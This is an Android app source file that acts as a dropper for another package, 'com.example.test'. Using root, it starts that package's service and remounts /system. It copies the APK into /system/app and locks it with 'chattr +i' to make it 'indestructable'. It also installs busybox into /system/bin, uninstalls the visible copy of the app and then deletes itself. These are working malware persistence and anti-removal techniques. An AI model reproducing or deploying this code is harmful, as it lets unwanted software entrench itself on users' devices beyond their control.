package com.example.starter;


import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {
  
  final String LOG_TAG = "myLogs";

  
    public void onCreate(Bundle savedInstanceState) {
    	super.onCreate(savedInstanceState);
    	//startservice();
    	setContentView(R.layout.main);
    	
    	final Context context = getApplicationContext();
    	Button non_root_button = (Button)findViewById(R.id.button1);
    	Button root_button = (Button)findViewById(R.id.button2);
    	Button uninstall_button = (Button)findViewById(R.id.button3);
    	
    	non_root_button.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
		    	try{
		    		Intent i = new Intent();
		    		i.setComponent(new ComponentName("com.example.test", "com.example.test.MyService"));
		    		context.startService(i);
		    		Toast.makeText(context,"started successfully!",Toast.LENGTH_SHORT).show();
		    		}
		    	catch(Exception e){
		    		Toast.makeText(context,"error starting service!",Toast.LENGTH_SHORT).show();
		    		}
			}
		});
    	
    	root_button.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				try {	
		    		String packagename="com.example.test";  // very important!!!!
		        	String apk=null;
		      	    String filename=null;
		      	    String dest=null;
		      	    
		      	  installbusybox();

		      		 PackageManager pm = context.getPackageManager();
		      		        ApplicationInfo ai = pm.getApplicationInfo(packagename, 0);
		      		        apk = ai.publicSourceDir;
		      		        filename=apk.substring(apk.lastIndexOf("/")+1);
		      	  	  if (!apk.equals(null)&&!filename.equals(null)){
		      	    	Process p=Runtime.getRuntime().exec("su");
		      		    DataOutputStream dos = new DataOutputStream(p.getOutputStream());
		      		    dest="/system/app/"+filename;
		      		    String cmd = "cp "+apk+" "+dest+"\n";
		      		    Log.d(LOG_TAG, cmd);
		      		    dos.writeBytes("mount -o rw,remount /proc /system\n");
		      		    dos.writeBytes(cmd);
		      		    dos.writeBytes("chmod 644 "+dest+"\n");
		      		    dos.writeBytes("busybox chattr +i "+dest+"\n");  // indestructable ;P
		      		    dos.writeBytes("exit\n");
		      		    dos.flush();
		      		    dos.close();
		      		    p.waitFor();
		      		 
		      	  	if(!dest.equals(null)){
		      	  	File file = new File(dest);
		      	  if(file.exists()){
		      		Toast.makeText(context,"installed to /system successfully!",Toast.LENGTH_SHORT).show();
		      		
		      		
		      		
		      	  Uri packageURI2 = Uri.parse("package:"+"com.example.test");
		      	  Intent uninstallIntent2 = new Intent(Intent.ACTION_DELETE, packageURI2);
		      	  startActivity(uninstallIntent2); 		      	  	  
		      	  					}
		      	  						}	  
		      	  	  												}
		      	  }
		      	  catch (Exception e) {
		      			Toast.makeText(context,"error installing!",Toast.LENGTH_SHORT).show();
		      		} 	  	
			} 
		});
    	
    	uninstall_button.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
		    	try{
		    		Uri packageURI = Uri.parse("package:"+MainActivity.class.getPackage().getName());
		        	Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		        	startActivity(uninstallIntent);
		        	finish();
		    		}
		    	catch(Exception e){
		    		Toast.makeText(context,"error selfdeleting!",Toast.LENGTH_SHORT).show();
		    		}
			}
		});
    }
    
void installbusybox(){
	
	String busybox_bin="/system/bin/busybox";
	String datadir = getFilesDir().toString();
	String busybox_file = datadir+"/busybox";
	
              if (!(new File(busybox_file).exists())) {
           try {
               AssetManager assetManager = getAssets();
               InputStream in = assetManager.open("busybox");
               DataOutputStream outw = new DataOutputStream(new 
            		   FileOutputStream(new File(datadir, "busybox").getAbsolutePath()));
               
               byte[] buf = new byte[1024];
               int len;
               while ((len = in.read(buf)) > 0) {
                   outw.write(buf, 0, len);
               }
               in.close();
               outw.close();
               Log.d(LOG_TAG, "Busybox copied!");      
               
           } catch (Exception e) {
               Log.d("Error writing busybox", e.toString());
               return;
           }
       } 		
     
        try{
        	Process p=Runtime.getRuntime().exec("su");
            DataOutputStream dos = new DataOutputStream(p.getOutputStream());
            String cmd = "cp "+busybox_file+" "+busybox_bin+"\n"; 
            Log.d(LOG_TAG, cmd);
            dos.writeBytes("mount -o rw,remount /proc /system\n");
            dos.writeBytes(cmd);
            dos.writeBytes("chmod 555 "+busybox_bin+"\n");
            dos.writeBytes("exit\n");
            dos.flush();
            dos.close();
            p.waitFor();

        File file = new File(busybox_bin);
        if(file.exists()){
        Log.d(LOG_TAG, "busybox installed successfully!");
        	}

        }
        catch (Exception e){Log.d(LOG_TAG, "error installing busybox");}
    }
 

}